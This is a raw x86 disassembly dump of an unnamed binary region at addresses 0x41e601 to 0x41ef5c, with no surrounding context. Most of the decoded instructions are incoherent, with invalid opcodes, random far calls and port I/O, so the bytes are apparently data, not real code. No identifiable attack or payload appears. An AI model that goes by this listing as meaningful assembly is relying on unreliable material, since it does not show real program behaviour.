  41e601:	mov    BYTE PTR ss:[ecx-0x46a2ae07],bh
  41e608:	pop    eax
  41e609:	or     DWORD PTR [edi],esi
  41e60b:	repz mov dh,0xda
  41e60e:	pushf  
  41e60f:	adc    dl,BYTE PTR [ecx-0x66]
  41e612:	and    BYTE PTR es:[eax+0x5f373e73],al
  41e619:	sbb    cl,bh
  41e61b:	sbb    DWORD PTR [esi+ecx*8+0x5a1284f4],edx
  41e622:	stos   BYTE PTR es:[edi],al
  41e623:	mov    ds:0x3a20168f,eax
  41e628:	xchg   esp,eax
  41e629:	adc    ebx,esi
  41e62b:	aad    0xa0
  41e62d:	mov    eax,0x3d95745a
  41e632:	call   0xfbf5:0x5f61a617
  41e639:	addr16 mov al,ds:0xe937
  41e63d:	iret   
  41e63e:	pop    edi
  41e63f:	xchg   ebp,eax
  41e640:	les    esi,FWORD PTR ds:0x48d805f1
  41e646:	dec    eax
  41e647:	test   ah,bl
  41e649:	stos   DWORD PTR es:[edi],eax
  41e64a:	iret   
  41e64b:	(bad)  
  41e64c:	loopne 0x41e607
  41e64e:	scas   eax,DWORD PTR es:[edi]
  41e64f:	ja     0x41e6a7
  41e651:	add    BYTE PTR [eax-0x42],dh
  41e654:	mov    BYTE PTR [edi+0x1e814486],ah
  41e65a:	imul   ebx,DWORD PTR [eax],0x9
  41e65d:	leave  
  41e65e:	sbb    eax,0xb6fa95a
  41e663:	scas   eax,DWORD PTR es:[edi]
  41e664:	daa    
  41e665:	sub    al,0x83
  41e667:	push   edi
  41e668:	sbb    al,0xd0
  41e66a:	cmp    BYTE PTR [edi+ebx*8+0x55047399],al
  41e671:	test   al,0xa7
  41e673:	out    dx,al
  41e674:	aaa    
  41e675:	inc    esp
  41e676:	inc    eax
  41e677:	add    DWORD PTR [ebx+edx*1],0x7d
  41e67b:	push   esp
  41e67c:	rcl    DWORD PTR [edi-0x703f840],cl
  41e682:	pop    es
  41e683:	mov    edx,0x25a20b27
  41e688:	jae    0x41e674
  41e68a:	ins    DWORD PTR es:[edi],dx
  41e68b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e68c:	cmp    DWORD PTR [esi+ebp*4+0xed],eax
	...
  41e6f3:	add    ch,al
  41e6f5:	cwde   
  41e6f6:	loope  0x41e74d
  41e6f8:	std    
  41e6f9:	jge    0x41e6f0
  41e6fb:	cwde   
  41e6fc:	xchg   esp,eax
  41e6fd:	push   0x37
  41e6ff:	sub    esp,ebx
  41e701:	cmp    eax,0x439c5500
  41e706:	add    DWORD PTR [eax],eax
  41e708:	add    al,0x1
  41e70a:	add    BYTE PTR [eax],al
  41e70c:	test   bh,dl
  41e70e:	lods   al,BYTE PTR ds:[esi]
  41e70f:	push   0x2f45eb2a
  41e714:	inc    ecx
  41e715:	bound  esi,QWORD PTR [ebx+0x591e1165]
  41e71b:	sub    BYTE PTR [edx+eax*8],ch
  41e71e:	cwde   
  41e71f:	fimul  WORD PTR [ecx-0x2c]
  41e722:	adc    al,0x20
  41e724:	jmp    0x41e734
  41e726:	inc    edx
  41e727:	mov    eax,0xeee0c508
  41e72c:	mov    ch,0xef
  41e72e:	lahf   
  41e72f:	loope  0x41e7ad
  41e731:	xlat   BYTE PTR ds:[ebx]
  41e732:	out    0xea,al
  41e734:	jp     0x41e741
  41e736:	aas    
  41e737:	push   edx
  41e738:	aas    
  41e739:	call   0xf6beb8d9
  41e73e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e73f:	mov    al,0x40
  41e741:	jg     0x41e751
  41e743:	pop    ss
  41e744:	push   edx
  41e745:	icebp  
  41e746:	sbb    dh,ah
  41e748:	and    BYTE PTR [ebp+0x24bbc66e],ah
  41e74e:	fnstsw WORD PTR [edi]
  41e750:	pop    ecx
  41e751:	stc    
  41e752:	jb     0x41e725
  41e754:	mov    edx,ebp
  41e756:	(bad)  
  41e757:	lods   eax,DWORD PTR ds:[esi]
  41e758:	outs   dx,BYTE PTR ds:[esi]
  41e759:	scas   eax,DWORD PTR es:[edi]
  41e75a:	ins    DWORD PTR es:[edi],dx
  41e75b:	ins    DWORD PTR es:[edi],dx
  41e75c:	pop    ss
  41e75d:	mov    al,ds:0x594640e7
  41e762:	loope  0x41e6ee
  41e764:	aaa    
  41e765:	mov    cl,0x15
  41e767:	lock or eax,esi
  41e76a:	stos   DWORD PTR es:[edi],eax
  41e76b:	xlat   BYTE PTR ds:[ebx]
  41e76c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e76d:	ret    0x52f5
  41e770:	in     eax,dx
  41e771:	add    DWORD PTR [eax-0x276f703f],ecx
  41e777:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e778:	sbb    ebp,0x7d
  41e77b:	inc    edx
  41e77c:	sbb    dh,BYTE PTR [ebp-0x7]
  41e77f:	pusha  
  41e780:	add    al,0x99
  41e782:	loopne 0x41e7a9
  41e784:	outs   dx,BYTE PTR ds:[esi]
  41e785:	add    eax,0x683f7a6e
  41e78a:	outs   dx,DWORD PTR ds:[esi]
  41e78b:	sub    cl,cl
  41e78d:	cld    
  41e78e:	int3   
  41e78f:	outs   dx,BYTE PTR ds:[esi]
  41e790:	jle    0x41e7d5
  41e792:	adc    eax,0x8c34df82
  41e797:	bound  ebp,QWORD PTR gs:[ecx+0x3d]
  41e79b:	pop    edx
  41e79c:	dec    esi
  41e79d:	pop    es
  41e79e:	lea    eax,[edx+0x22]
  41e7a1:	inc    edx
  41e7a2:	adc    edx,0x6c
  41e7a5:	inc    ebp
  41e7a6:	or     al,0xf1
  41e7a8:	lock xchg edi,eax
  41e7aa:	(bad)  
  41e7ab:	inc    esi
  41e7ac:	mov    dl,0xab
  41e7ae:	nop
  41e7af:	out    dx,al
  41e7b0:	lods   eax,DWORD PTR ds:[esi]
  41e7b1:	and    BYTE PTR [edx],0x2b
  41e7b4:	cmp    ebx,esp
  41e7b6:	mov    dl,0xb3
  41e7b8:	call   0x6733:0x733895d8
  41e7bf:	xchg   ebp,eax
  41e7c0:	enter  0x2ad1,0xa
  41e7c4:	jo     0x41e7df
  41e7c6:	jmp    0x41e7f4
  41e7c8:	cwde   
  41e7c9:	inc    edx
  41e7ca:	add    eax,0x253f06d5
  41e7cf:	xchg   al,ah
  41e7d1:	push   ebp
  41e7d2:	imul   edx,ebx,0xad8e4796
  41e7d8:	jg     0x41e7eb
  41e7da:	adc    eax,0xc744af0b
  41e7df:	repnz mov DWORD PTR [ebx-0x5d],edi
  41e7e3:	pop    edx
  41e7e4:	add    cl,BYTE PTR [ebx+0x2f3d73cb]
  41e7ea:	xchg   esi,eax
  41e7eb:	pop    esp
  41e7ec:	sub    DWORD PTR [ecx+0x70803166],esp
  41e7f2:	ret    0x4d16
  41e7f5:	mov    dh,0xc9
  41e7f7:	add    ah,BYTE PTR [edx-0x79]
  41e7fa:	int3   
  41e7fb:	ds mov ebp,0xd62f79a
  41e801:	and    edi,DWORD PTR [edx-0x7407694f]
  41e807:	fcomp  DWORD PTR [eax]
  41e809:	dec    eax
  41e80a:	ds mov dh,0x53
  41e80d:	mov    cl,ch
  41e80f:	loopne 0x41e811
	...
  41e871:	add    BYTE PTR [eax],al
  41e873:	add    BYTE PTR ds:0x9e5c8a39,ch
  41e879:	(bad)  
  41e87a:	(bad)  
  41e87b:	jns    0x41e8ec
  41e87d:	xor    al,0xcc
  41e87f:	jg     0x41e8c3
  41e881:	and    DWORD PTR [ecx+0x144a049],esi
  41e887:	add    BYTE PTR [ecx+eax*1],al
  41e88a:	add    BYTE PTR [eax],al
  41e88c:	imul   eax,DWORD PTR [ebp-0x1a5eed5d],0xffffff8c
  41e893:	and    ebx,eax
  41e895:	and    DWORD PTR [ecx+ebx*1],edx
  41e898:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e899:	in     eax,dx
  41e89a:	mov    eax,ds:0x31d71199
  41e89f:	push   edx
  41e8a0:	pop    edx
  41e8a1:	ficom  DWORD PTR [ebx+eiz*2]
  41e8a4:	sub    BYTE PTR [edx+0x5c6057e2],0xac
  41e8ab:	push   0xffffffa2
  41e8ad:	retf   0xee00
  41e8b0:	jb     0x41e929
  41e8b2:	loopne 0x41e847
  41e8b4:	leave  
  41e8b5:	pop    ebp
  41e8b6:	rcr    DWORD PTR [ebx-0x2aee39],cl
  41e8bc:	or     ah,bh
  41e8be:	mov    dh,0xa
  41e8c0:	cli    
  41e8c1:	bound  edx,QWORD PTR [esi-0x22]
  41e8c4:	enter  0x3cb6,0x44
  41e8c8:	dec    ecx
  41e8c9:	jne    0x41e917
  41e8cb:	dec    ebp
  41e8cc:	pusha  
  41e8cd:	addr16 sub al,0xa4
  41e8d0:	and    al,0x28
  41e8d2:	xor    ch,BYTE PTR [edx+esi*4-0xb]
  41e8d6:	pop    eax
  41e8d7:	mov    WORD PTR [esi+eiz*4-0x50],gs
  41e8db:	add    DWORD PTR [edx],eax
  41e8dd:	fs repz sti 
  41e8e0:	and    cl,BYTE PTR [ecx+eax*4+0x79]
  41e8e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e8e5:	(bad)  
  41e8e6:	jnp    0x41e95a
  41e8e8:	pop    ds
  41e8e9:	mov    DWORD PTR [ecx+edi*1],eax
  41e8ec:	stc    
  41e8ed:	mov    ?,edx
  41e8ef:	cmp    eax,0xcf73e822
  41e8f4:	into   
  41e8f5:	jno    0x41e8f9
  41e8f7:	mov    ch,0xf
  41e8f9:	mov    edi,0x635f5990
  41e8fe:	xor    DWORD PTR [edx-0x27dd753b],0x4badc825
  41e908:	xchg   ecx,eax
  41e909:	jnp    0x41e917
  41e90b:	xchg   DWORD PTR [eax+eax*8+0x7288f973],edi
  41e912:	xor    esp,esp
  41e914:	inc    esp
  41e915:	jge    0x41e8d4
  41e917:	push   ebp
  41e918:	fsubr  DWORD PTR [edi]
  41e91a:	out    0x27,al
  41e91c:	dec    ebp
  41e91d:	call   0x16d0:0x339b9fe4
  41e924:	cmp    DWORD PTR [edi-0x59],esp
  41e927:	push   ebp
  41e928:	mov    cl,0x3b
  41e92a:	push   cs
  41e92b:	retf   
  41e92c:	cld    
  41e92d:	mov    eax,0x1fe932a0
  41e932:	adc    DWORD PTR [ebx-0x3700cd0f],eax
  41e938:	push   0x41546e9
  41e93d:	inc    ebx
  41e93e:	mov    al,0x65
  41e940:	les    ecx,FWORD PTR [ecx+0x29]
  41e943:	lahf   
  41e944:	(bad)  
  41e945:	es in  eax,dx
  41e947:	cdq    
  41e948:	fistp  WORD PTR [ebp-0x7c]
  41e94b:	mov    ebx,0xcd48d717
  41e950:	xchg   ebx,eax
  41e951:	sbb    DWORD PTR [ecx],0x59
  41e954:	cmp    eax,0x39e2fc56
  41e959:	push   ebx
  41e95a:	(bad)  
  41e95c:	mov    dl,0xe7
  41e95e:	loopne 0x41e984
  41e960:	mov    ds:0x26b7756f,al
  41e965:	aas    
  41e966:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e967:	setns  BYTE PTR [eax+0x72]
  41e96b:	popa   
  41e96c:	mov    cl,0xe3
  41e96e:	fwait
  41e96f:	mov    eax,DWORD PTR [edi+0x5f]
  41e972:	aam    0x60
  41e974:	sub    DWORD PTR [eax+0x737d07c6],edx
  41e97a:	xchg   DWORD PTR [eax+eax*4],esp
  41e97d:	add    BYTE PTR [esi-0x4f],dh
  41e980:	call   0xe0cb0ab2
  41e985:	dec    ecx
  41e986:	inc    edi
  41e987:	mov    ecx,0xd36ffefd
  41e98c:	es in  eax,dx
  41e98e:	pop    esi
  41e98f:	imul   eax,DWORD PTR [eax],0x0
	...
  41e9f1:	add    BYTE PTR [eax],al
  41e9f3:	add    BYTE PTR [eax-0x3],bh
  41e9f6:	ret    0xc766
  41e9f9:	jg     0x41e9f7
  41e9fb:	dec    DWORD PTR [edi+0x67]
  41e9fe:	rol    dl,1
  41ea00:	(bad)  
  41ea02:	sbb    bh,bl
  41ea04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ea05:	inc    ebp
  41ea06:	add    DWORD PTR [eax],eax
  41ea08:	add    al,0x1
  41ea0a:	add    BYTE PTR [eax],al
  41ea0c:	btc    edi,esi
  41ea0f:	xchg   esi,eax
  41ea11:	lea    edx,[edi+0x5]
  41ea14:	xor    BYTE PTR [ecx],al
  41ea16:	mov    ebp,0x42f5a5d3
  41ea1b:	ja     0x41e9a9
  41ea1d:	cmc    
  41ea1e:	mov    esi,0xa0edfb8e
  41ea23:	ja     0x41ea7f
  41ea25:	sub    ebp,DWORD PTR [edi+0x213280e5]
  41ea2b:	aaa    
  41ea2c:	inc    eax
  41ea2d:	mov    dl,0x7b
  41ea2f:	mov    ah,0x4a
  41ea31:	xor    al,0xa7
  41ea33:	std    
  41ea34:	std    
  41ea35:	inc    edi
  41ea36:	inc    esp
  41ea37:	scas   al,BYTE PTR es:[edi]
  41ea38:	arpl   cx,bx
  41ea3a:	pushf  
  41ea3b:	push   edx
  41ea3c:	es mov al,0xfe
  41ea3f:	push   esp
  41ea40:	jnp    0x41ea07
  41ea42:	mov    ecx,0x7649e9fb
  41ea47:	enter  0xb23d,0x9
  41ea4b:	push   edi
  41ea4c:	push   esp
  41ea4d:	hlt    
  41ea4e:	int3   
  41ea4f:	in     al,dx
  41ea50:	test   BYTE PTR [edi+0x213b5b78],0x3d
  41ea57:	mov    edx,0x17ff0e36
  41ea5c:	mov    bl,BYTE PTR [esi+0x2a]
  41ea5f:	in     al,dx
  41ea60:	out    0xd4,eax
  41ea62:	daa    
  41ea63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ea64:	(bad)  
  41ea66:	add    ecx,DWORD PTR [ebp+0x5b]
  41ea69:	mov    WORD PTR [eax+0x52e85af6],?
  41ea6f:	pop    es
  41ea70:	mov    ebx,0xc05c4b1
  41ea75:	pushf  
  41ea76:	fsubr  QWORD PTR [eax]
  41ea78:	push   edx
  41ea79:	in     eax,0x93
  41ea7b:	mov    edx,0x3908f50d
  41ea80:	(bad)  
  41ea82:	inc    ebx
  41ea83:	nop
  41ea84:	shl    dh,1
  41ea86:	push   0xffffff95
  41ea88:	iret   
  41ea89:	pop    esi
  41ea8a:	jnp    0x41ea1f
  41ea8c:	xor    eax,0xf191577c
  41ea91:	mov    ds:0xa52f850b,eax
  41ea96:	scas   al,BYTE PTR es:[edi]
  41ea97:	addr16 inc eax
  41ea99:	loopne 0x41ea79
  41ea9b:	adc    DWORD PTR [ebx],eax
  41ea9d:	jae    0x41ead1
  41ea9f:	and    edi,0xffffffc2
  41eaa2:	dec    ebx
  41eaa3:	sub    eax,0x456068
  41eaa8:	lahf   
  41eaa9:	enter  0x3aff,0x30
  41eaad:	outs   dx,DWORD PTR ds:[esi]
  41eaae:	dec    edx
  41eaaf:	fmul   DWORD PTR [eax+0x7d332e1e]
  41eab5:	lods   eax,DWORD PTR ds:[esi]
  41eab6:	xor    DWORD PTR [eax+0x60a1b6c],ebp
  41eabc:	or     edi,ebp
  41eabe:	mov    ah,0x2f
  41eac0:	retf   
  41eac1:	(bad)  [esi-0x7b]
  41eac4:	pop    ebx
  41eac5:	imul   ecx,DWORD PTR [edi+0x51],0x5e
  41eac9:	add    ebx,DWORD PTR ds:0xeee66d17
  41eacf:	bound  ebp,QWORD PTR [ecx+0x7f]
  41ead2:	in     al,0x9f
  41ead4:	imul   DWORD PTR [eax]
  41ead6:	add    esi,0xffffffe3
  41ead9:	add    BYTE PTR [edi-0x64df768c],cl
  41eadf:	arpl   WORD PTR [ebp-0x68],di
  41eae2:	jbe    0x41eb31
  41eae4:	fwait
  41eae5:	pop    ds
  41eae6:	mov    bl,0xcb
  41eae8:	xchg   DWORD PTR [eax-0x381c6a34],ecx
  41eaee:	repz inc eax
  41eaf0:	inc    ebx
  41eaf1:	and    bh,BYTE PTR [edi+ecx*1]
  41eaf4:	inc    eax
  41eaf5:	xchg   ebx,eax
  41eaf6:	into   
  41eaf7:	dec    esi
  41eaf8:	jbe    0x41eb23
  41eafa:	sbb    BYTE PTR [edi],ah
  41eafc:	paddsb mm0,QWORD PTR [eax+0x39]
  41eb00:	sub    eax,DWORD PTR [ebp-0x77fbdad2]
  41eb06:	mov    cl,0xcc
  41eb08:	clc    
  41eb09:	in     eax,dx
  41eb0a:	jge    0x41eac4
  41eb0c:	dec    ecx
  41eb0d:	lea    edx,[edi]
  41eb0f:	mov    ecx,0x0
	...
  41eb74:	adc    ch,BYTE PTR [edi]
  41eb76:	mov    esi,DWORD PTR [edi+edi*4+0xaaf3fb4]
  41eb7d:	out    0x9b,al
  41eb7f:	aad    0x2a
  41eb81:	mov    esp,0x46a84beb
  41eb86:	add    DWORD PTR [eax],eax
  41eb88:	add    al,0x1
  41eb8a:	add    BYTE PTR [eax],al
  41eb8c:	(bad)  
  41eb8d:	jmp    0x41eb18
  41eb8f:	jae    0x41eb79
  41eb91:	cmp    eax,0x248f963
  41eb96:	sub    eax,0x57e848a7
  41eb9b:	loope  0x41ebf0
  41eb9d:	add    al,0x29
  41eb9f:	call   0x74106b2b
  41eba4:	pop    ds
  41eba5:	aam    0x81
  41eba7:	int3   
  41eba8:	enter  0xf448,0x93
  41ebac:	sbb    ebx,DWORD PTR [edx+0x61082618]
  41ebb2:	and    ebp,esi
  41ebb4:	shr    BYTE PTR [eax+0x60],cl
  41ebb7:	and    DWORD PTR [ecx+0x67c06f9a],esi
  41ebbd:	cmp    edx,ebx
  41ebbf:	sbb    eax,0xd13a4854
  41ebc4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ebc5:	fs ret 
  41ebc7:	mov    ds:0xd8c101a,eax
  41ebcc:	xchg   BYTE PTR [ebp-0x2e72db82],al
  41ebd2:	or     DWORD PTR [edi+esi*8],eax
  41ebd5:	scas   eax,DWORD PTR es:[edi]
  41ebd6:	mov    esp,0xe75c2f43
  41ebdb:	lods   al,BYTE PTR ds:[esi]
  41ebdc:	xchg   ebp,eax
  41ebdd:	mov    bl,0xf1
  41ebdf:	loopne 0x41eba4
  41ebe1:	push   0x2321055b
  41ebe6:	ret    
  41ebe7:	push   edx
  41ebe8:	cdq    
  41ebe9:	cmp    DWORD PTR [ecx],esi
  41ebeb:	sahf   
  41ebec:	fcmovb st,st(2)
  41ebee:	hlt    
  41ebef:	fs jo  0x41eb7b
  41ebf2:	mov    eax,edx
  41ebf4:	mov    dh,0xc0
  41ebf6:	jb     0x41ebf0
  41ebf8:	out    dx,al
  41ebf9:	or     DWORD PTR [edx+0x4f],edx
  41ebfc:	test   al,0x83
  41ebfe:	stos   DWORD PTR es:[edi],eax
  41ebff:	pop    edi
  41ec00:	sbb    al,ch
  41ec02:	adc    ch,BYTE PTR [ebx+0x655bcf67]
  41ec08:	(bad)  
  41ec09:	outs   dx,DWORD PTR ds:[esi]
  41ec0a:	or     al,BYTE PTR [eax]
  41ec0c:	in     al,0x96
  41ec0e:	sbb    bl,BYTE PTR [ebx]
  41ec10:	icebp  
  41ec11:	push   esi
  41ec12:	sbb    dh,BYTE PTR [edx]
  41ec14:	dec    ebx
  41ec15:	jnp    0x41ec59
  41ec17:	add    esp,DWORD PTR [esp+eiz*8-0x6c]
  41ec1b:	nop
  41ec1c:	gs or  al,0xb9
  41ec1f:	fnsave [esi]
  41ec21:	int    0x38
  41ec23:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ec24:	mov    cs,WORD PTR [ebx-0x26]
  41ec27:	aaa    
  41ec28:	fdiv   QWORD PTR [ebx+0x674ca890]
  41ec2e:	push   ss
  41ec2f:	jbe    0x41ec20
  41ec31:	cdq    
  41ec32:	repz fwait
  41ec34:	enter  0xf98d,0x89
  41ec38:	imul   edx,DWORD PTR [ebp+0x17998e9f],0xffffffeb
  41ec3f:	or     BYTE PTR [ecx+0x1860014],bl
  41ec45:	lods   al,BYTE PTR ds:[esi]
  41ec46:	call   0x3e6:0xcb24bf62
  41ec4d:	scas   eax,DWORD PTR es:[edi]
  41ec4e:	enter  0x736e,0xe4
  41ec52:	mov    ebp,0x686458a0
  41ec57:	xor    eax,0xcde371c6
  41ec5c:	mov    ebx,0xfb827240
  41ec61:	fnstcw WORD PTR [ebx+0x12d30599]
  41ec67:	inc    edi
  41ec68:	jae    0x41ec4b
  41ec6a:	jmp    DWORD PTR [edi+0x74219865]
  41ec71:	inc    esp
  41ec72:	rcr    DWORD PTR [ecx+0xe],cl
  41ec75:	sub    dl,BYTE PTR [edi]
  41ec77:	inc    edi
  41ec78:	xchg   ecx,eax
  41ec79:	pop    esp
  41ec7a:	jg     0x41ec53
  41ec7c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ec7d:	test   DWORD PTR [ebx],eax
  41ec7f:	retf   
  41ec80:	jecxz  0x41ec4d
  41ec82:	inc    eax
  41ec83:	ds jmp 0x2794:0xa58c6a86
  41ec8b:	int3   
  41ec8c:	retf   0xc6a8
  41ec8f:	xor    eax,DWORD PTR [eax]
	...
  41ecf1:	add    BYTE PTR [eax],al
  41ecf3:	add    BYTE PTR [ecx-0xf],al
  41ecf6:	(bad)
  41ecf9:	hlt    
  41ecfa:	gs icebp 
  41ecfc:	dec    edi
  41ecfd:	adc    eax,0x971c5fd0
  41ed02:	push   0x43
  41ed04:	lods   al,BYTE PTR ds:[esi]
  41ed05:	inc    edi
  41ed06:	add    DWORD PTR [eax],eax
  41ed08:	add    al,0x1
  41ed0a:	add    BYTE PTR [eax],al
  41ed0c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ed0d:	fnstcw WORD PTR [edx-0x37]
  41ed10:	repnz push edx
  41ed12:	loopne 0x41ed37
  41ed14:	and    eax,0x940d9dae
  41ed19:	and    BYTE PTR [edi],al
  41ed1b:	into   
  41ed1c:	add    ebp,DWORD PTR [eax]
  41ed1e:	xlat   BYTE PTR ds:[ebx]
  41ed1f:	xchg   esp,eax
  41ed20:	mov    ?,ebp
  41ed22:	call   0xc0e1:0x2ae9924c
  41ed29:	int3   
  41ed2a:	mov    ?,WORD PTR [esi]
  41ed2c:	sbb    eax,DWORD PTR [edx]
  41ed2e:	pop    eax
  41ed2f:	gs xchg dh,ch
  41ed32:	push   edx
  41ed33:	mov    edx,0x50c3f93d
  41ed38:	add    al,0x55
  41ed3a:	sti    
  41ed3b:	adc    eax,0x30759626
  41ed40:	out    dx,eax
  41ed41:	sbb    DWORD PTR [ecx*1+0x3ff3bc0f],esi
  41ed48:	dec    esp
  41ed49:	loope  0x41ed54
  41ed4b:	js     0x41ecda
  41ed4d:	lods   al,BYTE PTR ds:[esi]
  41ed4e:	pop    ss
  41ed4f:	(bad)  
  41ed50:	xlat   BYTE PTR ds:[ebx]
  41ed51:	push   ebx
  41ed52:	sub    cl,BYTE PTR [ebp+0x26]
  41ed55:	dec    ebx
  41ed56:	mov    ds:0xc3014f91,al
  41ed5b:	and    al,0xf1
  41ed5d:	es or  eax,0x82ea21ea
  41ed63:	pop    ecx
  41ed64:	cmp    bh,BYTE PTR [esi+0x62a51ff3]
  41ed6a:	push   ecx
  41ed6b:	sub    al,0xa4
  41ed6d:	push   edi
  41ed6e:	fist   DWORD PTR [edx+0x2b]
  41ed71:	push   ebp
  41ed72:	xchg   esp,eax
  41ed73:	aaa    
  41ed74:	mov    DWORD PTR [eax],edi
  41ed76:	(bad)  
  41ed77:	or     DWORD PTR [ebp-0x3b0adb4b],ebx
  41ed7d:	out    dx,eax
  41ed7e:	stos   BYTE PTR es:[edi],al
  41ed7f:	gs pop ebx
  41ed81:	imul   BYTE PTR [ecx]
  41ed83:	xor    DWORD PTR [edi],0xf2fdc0ae
  41ed89:	stos   DWORD PTR es:[edi],eax
  41ed8a:	xor    dl,BYTE PTR [eax]
  41ed8c:	sti    
  41ed8d:	xor    al,dl
  41ed8f:	adc    DWORD PTR [ecx],edx
  41ed91:	xor    DWORD PTR ds:0x15a588dc,0x3f
  41ed98:	bound  ecx,QWORD PTR [ecx+0x7e]
  41ed9b:	out    0x3d,eax
  41ed9d:	jg     0x41ede3
  41ed9f:	jnp    0x41edf6
  41eda1:	inc    esp
  41eda2:	retf   0x31dc
  41eda5:	xchg   ebp,eax
  41eda6:	ds bound ebp,QWORD PTR gs:[edx]
  41edaa:	xor    dh,cl
  41edac:	out    dx,eax
  41edad:	mov    bl,0x6c
  41edaf:	dec    ebp
  41edb0:	scas   al,BYTE PTR es:[edi]
  41edb1:	or     dh,bl
  41edb3:	xchg   ebx,eax
  41edb4:	push   0xfffffff2
  41edb6:	and    esp,ebx
  41edb8:	(bad)  
  41edb9:	cmp    BYTE PTR [esi-0x9],ch
  41edbc:	jmp    0x700e0713
  41edc1:	(bad)  
  41edc2:	xor    DWORD PTR [ecx-0x65],eax
  41edc5:	sti    
  41edc6:	jge    0x41edf3
  41edc8:	js     0x41ee22
  41edca:	mov    bl,BYTE PTR [eax-0x67]
  41edcd:	push   edx
  41edce:	mul    esp
  41edd0:	scas   eax,DWORD PTR es:[edi]
  41edd1:	jmp    0x2348d5b8
  41edd6:	or     DWORD PTR [esi-0x57],edx
  41edd9:	xchg   edx,eax
  41edda:	aas    
  41eddb:	mov    ?,ebx
  41eddd:	idiv   DWORD PTR ds:0xc2b88596
  41ede3:	sbb    DWORD PTR [eax],0xffffff8f
  41ede6:	adc    DWORD PTR [edi-0x46],0x5597e9be
  41eded:	add    al,0xc7
  41edef:	mov    BYTE PTR [eax-0x7e2daad3],al
  41edf5:	sbb    BYTE PTR [ebx+0x1b15b6a2],bl
  41edfb:	(bad)  
  41edfc:	popf   
  41edfd:	push   ebx
  41edfe:	xchg   esp,eax
  41edff:	stc    
  41ee00:	jmp    0x1658:0x100eb539
  41ee07:	test   al,0xac
  41ee09:	aaa    
  41ee0a:	jge    0x41ee0d
  41ee0c:	pop    ds
  41ee0d:	cmc    
  41ee0e:	add    DWORD PTR [edi+0x0],ecx
	...
  41ee71:	add    BYTE PTR [eax],al
  41ee73:	add    BYTE PTR ds:0x7b197956,al
  41ee79:	aas    
  41ee7a:	gs pop esi
  41ee7c:	pop    edx
  41ee7d:	repnz call 0xb01d:0xec99b1e7
  41ee85:	dec    eax
  41ee86:	add    DWORD PTR [eax],eax
  41ee88:	add    al,0x1
  41ee8a:	add    BYTE PTR [eax],al
  41ee8c:	add    al,0x1b
  41ee8e:	cmp    BYTE PTR [edi+0x20eadc3b],cl
  41ee94:	mov    eax,ds:0x36148a0
  41ee99:	or     bh,bh
  41ee9b:	lods   al,BYTE PTR ds:[esi]
  41ee9c:	(bad)  
  41ee9d:	sub    ecx,esi
  41ee9f:	mov    ah,0x92
  41eea1:	inc    esi
  41eea2:	push   ebp
  41eea3:	jno    0x41eea2
  41eea5:	and    ebx,edx
  41eea7:	inc    ebx
  41eea8:	and    ebx,0x78
  41eeab:	push   cs
  41eeac:	sub    ebp,eax
  41eeae:	sbb    al,0x8f
  41eeb0:	xor    BYTE PTR [ebx+0x5b],dh
  41eeb3:	(bad)  
  41eeb4:	std    
  41eeb5:	scas   eax,DWORD PTR es:[edi]
  41eeb6:	inc    ebx
  41eeb7:	sub    ecx,DWORD PTR [edi+0x24]
  41eeba:	add    DWORD PTR [ebx-0x3c],0xc7f33f31
  41eec1:	jo     0x41eeea
  41eec3:	ins    DWORD PTR es:[edi],dx
  41eec4:	pop    ebp
  41eec5:	out    dx,al
  41eec6:	fcmovbe st,st(3)
  41eec8:	mov    ch,0xb2
  41eeca:	sbb    BYTE PTR cs:[edx+esi*8+0x1cbd7acf],bh
  41eed2:	pop    ss
  41eed3:	mov    WORD PTR [eax-0x27],ds
  41eed6:	lock add eax,0x4548e7d
  41eedc:	lds    edx,FWORD PTR ds:0xceeeca48
  41eee2:	jnp    0x41ee97
  41eee4:	pusha  
  41eee5:	adc    al,0x10
  41eee7:	dec    eax
  41eee8:	mov    dh,0x7d
  41eeea:	into   
  41eeeb:	sbb    al,0xae
  41eeed:	sub    esi,DWORD PTR [ebp-0x14]
  41eef0:	mov    esi,0xb92ae865
  41eef5:	and    eax,0x618084ab
  41eefa:	cmp    bh,dh
  41eefc:	enter  0x7410,0x68
  41ef00:	and    DWORD PTR [ebx],ecx
  41ef02:	sub    al,0x59
  41ef04:	xchg   ecx,eax
  41ef05:	adc    eax,0x64ce83c0
  41ef0a:	jg     0x41ef0e
  41ef0c:	lods   al,BYTE PTR ds:[esi]
  41ef0d:	nop
  41ef0e:	lahf   
  41ef0f:	in     eax,dx
  41ef10:	xchg   DWORD PTR [edi+0x3f87e22f],esp
  41ef16:	xchg   esi,eax
  41ef17:	hlt    
  41ef18:	inc    edx
  41ef19:	rcr    DWORD PTR ds:0x4e6d92ff,0xfa
  41ef20:	adc    DWORD PTR [edi],edi
  41ef22:	push   ecx
  41ef23:	sbb    al,cl
  41ef25:	stos   BYTE PTR es:[edi],al
  41ef26:	icebp  
  41ef27:	(bad)  
  41ef29:	push   esi
  41ef2a:	mov    ebx,0xd3d66682
  41ef2f:	scas   eax,DWORD PTR es:[edi]
  41ef30:	repz call 0x9655945e
  41ef36:	mov    eax,ds:0xfc48d6e
  41ef3b:	mov    ebx,0x14b9de2d
  41ef40:	inc    bx
  41ef42:	loop   0x41ef50
  41ef44:	popa   
  41ef45:	cs ins BYTE PTR es:[edi],dx
  41ef47:	push   edi
  41ef48:	push   eax
  41ef49:	dec    edx
  41ef4a:	mov    WORD PTR [ecx],fs
  41ef4c:	add    DWORD PTR [eax-0x14],ecx
  41ef4f:	jle    0x41ef22
  41ef51:	and    cl,0x40
  41ef54:	mov    bh,0x27
  41ef56:	xor    BYTE PTR [esp+edx*8+0x5c],0xc3
  41ef5b:	retf   
  41ef5c:	ss jmp 0x260d:0xef50d2
